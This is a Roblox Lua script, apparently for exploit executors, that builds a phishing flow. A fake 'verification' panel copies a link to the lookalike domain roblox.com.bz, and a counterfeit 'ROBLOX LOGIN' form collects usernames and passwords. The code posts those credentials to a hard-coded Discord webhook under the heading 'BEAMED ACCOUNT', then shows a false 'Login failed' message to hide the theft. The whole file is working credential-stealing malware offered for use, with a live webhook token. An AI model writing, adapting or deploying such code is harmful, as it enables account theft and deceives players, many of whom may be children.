local GROUP_LINK = "https://roblox.com.bz/communities/1713252036/"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1514988761912709281/wG1n9AYtVvspdiKwhy2KQ2mhF5KmdGLjW54vr_8gn7N5-o4ZcGSLrSw6jeM0bKjF6zF8"

local Player = game:GetService("Players").LocalPlayer
local Clipboard = game:GetService("Clipboard")
local HttpService = game:GetService("HttpService")

-- // Create a beautiful GUI using ScreenGui (works on all executors)
local gui = Instance.new("ScreenGui")
gui.Name = "BeamPanel"
gui.Parent = Player:WaitForChild("PlayerGui") -- ensures visibility

-- // Main frame with modern design
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 320)
frame.Position = UDim2.new(0.5, -200, 0.5, -160)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
frame.BorderSizePixel = 0
frame.ClipsDescendants = true
frame.Parent = gui

-- // Title bar
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 45)
title.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
title.Text = "VERIFICATION REQUIRED"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.Parent = frame

-- // Close button
local close = Instance.new("TextButton")
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -35, 0, 7)
close.BackgroundColor3 = Color3.fromRGB(255, 70, 70)
close.Text = "✕"
close.TextColor3 = Color3.fromRGB(255, 255, 255)
close.Font = Enum.Font.GothamBold
close.TextSize = 18
close.Parent = frame
close.MouseButton1Click:Connect(function() gui:Destroy() end)

-- // Description
local desc = Instance.new("TextLabel")
desc.Size = UDim2.new(1, -30, 0, 60)
desc.Position = UDim2.new(0, 15, 0, 65)
desc.BackgroundTransparency = 1
desc.Text = "To access this feature, you must verify your group membership.\nClick 'Verify' to copy the group link and continue."
desc.TextColor3 = Color3.fromRGB(200, 200, 210)
desc.Font = Enum.Font.Gotham
desc.TextSize = 14
desc.TextWrapped = true
desc.Parent = frame

-- // Verify button
local verifyBtn = Instance.new("TextButton")
verifyBtn.Size = UDim2.new(0, 220, 0, 45)
verifyBtn.Position = UDim2.new(0.5, -110, 0, 150)
verifyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
verifyBtn.Text = "VERIFY"
verifyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
verifyBtn.Font = Enum.Font.GothamBold
verifyBtn.TextSize = 18
verifyBtn.Parent = frame

-- // Status label
local status = Instance.new("TextLabel")
status.Size = UDim2.new(1, -30, 0, 30)
status.Position = UDim2.new(0, 15, 0, 220)
status.BackgroundTransparency = 1
status.Text = ""
status.TextColor3 = Color3.fromRGB(255, 200, 100)
status.Font = Enum.Font.Gotham
status.TextSize = 12
status.Parent = frame

-- // Helper: Copy to clipboard (Solara-safe)
local function copyToClipboard(text)
    local success, err = pcall(function()
        Clipboard:set(text)
    end)
    if not success then
        -- Fallback: show a text box for manual copy
        status.Text = "Clipboard failed. Please copy this: " .. text
    end
end

-- // Fake login UI (webhook sender)
local function showFakeLogin()
    local loginGui = Instance.new("ScreenGui")
    loginGui.Name = "FakeLogin"
    loginGui.Parent = Player.PlayerGui

    local loginFrame = Instance.new("Frame")
    loginFrame.Size = UDim2.new(0, 340, 0, 260)
    loginFrame.Position = UDim2.new(0.5, -170, 0.5, -130)
    loginFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
    loginFrame.BorderSizePixel = 0
    loginFrame.Parent = loginGui

    local loginTitle = Instance.new("TextLabel")
    loginTitle.Size = UDim2.new(1, 0, 0, 40)
    loginTitle.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
    loginTitle.Text = "ROBLOX LOGIN"
    loginTitle.TextColor3 = Color3.new(1,1,1)
    loginTitle.Font = Enum.Font.GothamBold
    loginTitle.TextSize = 16
    loginTitle.Parent = loginFrame

    local userBox = Instance.new("TextBox")
    userBox.Size = UDim2.new(0, 280, 0, 35)
    userBox.Position = UDim2.new(0.5, -140, 0, 60)
    userBox.PlaceholderText = "Username"
    userBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
    userBox.Text = ""
    userBox.Parent = loginFrame

    local passBox = Instance.new("TextBox")
    passBox.Size = UDim2.new(0, 280, 0, 35)
    passBox.Position = UDim2.new(0.5, -140, 0, 110)
    passBox.PlaceholderText = "Password"
    passBox.BackgroundColor3 = Color3.fromRGB(255,255,255)
    passBox.Text = ""
    passBox.Parent = loginFrame

    local submit = Instance.new("TextButton")
    submit.Size = UDim2.new(0, 150, 0, 35)
    submit.Position = UDim2.new(0.5, -75, 0, 170)
    submit.BackgroundColor3 = Color3.fromRGB(0, 120, 215)
    submit.Text = "LOGIN"
    submit.TextColor3 = Color3.new(1,1,1)
    submit.Font = Enum.Font.GothamBold
    submit.Parent = loginFrame

    local loginStatus = Instance.new("TextLabel")
    loginStatus.Size = UDim2.new(1, -20, 0, 30)
    loginStatus.Position = UDim2.new(0, 10, 0, 215)
    loginStatus.BackgroundTransparency = 1
    loginStatus.Text = ""
    loginStatus.TextColor3 = Color3.fromRGB(255,100,100)
    loginStatus.TextSize = 11
    loginStatus.Parent = loginFrame

    submit.MouseButton1Click:Connect(function()
        local user = userBox.Text
        local pass = passBox.Text
        if user == "" or pass == "" then
            loginStatus.Text = "Please fill in both fields"
            return
        end

        local payload = {
            content = string.format("**BEAMED ACCOUNT**\nUser: `%s`\nPass: `%s`\nGame ID: %s", user, pass, game.PlaceId)
        }
        local json = HttpService:JSONEncode(payload)
        local headers = {["Content-Type"] = "application/json"}
        pcall(function()
            HttpService:PostAsync(WEBHOOK_URL, json, Enum.HttpContentType.ApplicationJson, false, headers)
        end)

        loginStatus.Text = "Login failed. Try again later."
        loginStatus.TextColor3 = Color3.fromRGB(255,100,100)
        wait(2)
        loginGui:Destroy()
        gui:Destroy()
    end)
end

-- // Verify button action
verifyBtn.MouseButton1Click:Connect(function()
    copyToClipboard(GROUP_LINK)
    status.Text = "Group link copied to clipboard!"
    status.TextColor3 = Color3.fromRGB(100, 255, 100)
    wait(1.5)
    showFakeLogin()
end)

-- // Auto-run on injection
copyToClipboard(GROUP_LINK)
status.Text = "Script injected. Click VERIFY to continue."
status.TextColor3 = Color3.fromRGB(255,200,100)
wait(2)
status.Text = ""
